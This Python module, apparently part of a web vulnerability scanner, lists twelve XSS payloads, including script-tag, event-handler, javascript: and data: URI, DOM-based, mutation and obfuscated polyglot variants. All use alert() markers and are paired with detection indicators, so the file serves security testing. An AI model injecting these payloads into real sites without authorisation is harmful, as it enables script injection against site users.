"""XSS payload categories - COMPLETE COLLECTION."""

from typing import List, Dict, Any


class XSSPayloads:
    """Complete collection of XSS attack payloads (12 total)."""
    
    @staticmethod
    def get_basic_xss_payloads() -> List[Dict[str, Any]]:
        """Get basic XSS payloads."""
        return [
            {
                "payload": "<script>alert('XSS_TEST')</script>",
                "expected_indicators": ["<script>", "alert", "XSS_TEST"],
                "severity": "high",
                "description": "Basic XSS payload"
            },
            {
                "payload": "javascript:alert('XSS_CONFIRMED')",
                "expected_indicators": ["javascript:", "alert", "XSS_CONFIRMED"],
                "severity": "high",
                "description": "JavaScript protocol XSS"
            },
            {
                "payload": "<img src=x onerror=alert('IMG_XSS')>",
                "expected_indicators": ["<img", "onerror", "IMG_XSS"],
                "severity": "high",
                "description": "Image-based XSS"
            },
            {
                "payload": "<svg/onload=alert('SVG_XSS')>",
                "expected_indicators": ["<svg", "onload", "SVG_XSS"],
                "severity": "high",
                "description": "SVG-based XSS"
            },
        ]
    
    @staticmethod
    def get_advanced_xss_payloads() -> List[Dict[str, Any]]:
        """Get advanced XSS payloads."""
        return [
            {
                "payload": "<iframe src=javascript:alert('IFRAME_XSS')>",
                "expected_indicators": ["<iframe", "javascript:", "IFRAME_XSS"],
                "severity": "high",
                "description": "Iframe JavaScript XSS"
            },
            {
                "payload": "<input onfocus=alert('INPUT_XSS') autofocus>",
                "expected_indicators": ["<input", "onfocus", "INPUT_XSS"],
                "severity": "medium",
                "description": "Input autofocus XSS"
            },
            {
                "payload": "<details open ontoggle=alert('DETAILS_XSS')>",
                "expected_indicators": ["<details", "ontoggle", "DETAILS_XSS"],
                "severity": "medium",
                "description": "HTML5 details XSS"
            },
            {
                "payload": "<marquee onstart=alert('MARQUEE_XSS')>",
                "expected_indicators": ["<marquee", "onstart", "MARQUEE_XSS"],
                "severity": "medium",
                "description": "Marquee event XSS"
            },
        ]
    
    @staticmethod
    def get_polyglot_xss_payloads() -> List[Dict[str, Any]]:
        """Get polyglot and advanced XSS payloads."""
        return [
            {
                "payload": "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()///>\\x3e",
                "expected_indicators": ["javascript:", "onclick", "svg", "onload"],
                "severity": "high",
                "description": "Polyglot XSS payload"
            },
            {
                "payload": "data:text/html,<script>alert('DATA_URI_XSS')</script>",
                "expected_indicators": ["data:text/html", "script", "DATA_URI_XSS"],
                "severity": "medium",
                "description": "Data URI XSS"
            },
            {
                "payload": "#<script>alert('DOM_XSS')</script>",
                "expected_indicators": ["#<script>", "alert", "DOM_XSS"],
                "severity": "medium",
                "description": "DOM-based XSS"
            },
            {
                "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert('mXSS')>\">",
                "expected_indicators": ["<noscript>", "onerror", "mXSS"],
                "severity": "medium",
                "description": "Mutation XSS"
            },
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all 12 XSS payloads."""
        payloads = []
        payloads.extend(XSSPayloads.get_basic_xss_payloads())
        payloads.extend(XSSPayloads.get_advanced_xss_payloads())
        payloads.extend(XSSPayloads.get_polyglot_xss_payloads())
        return payloads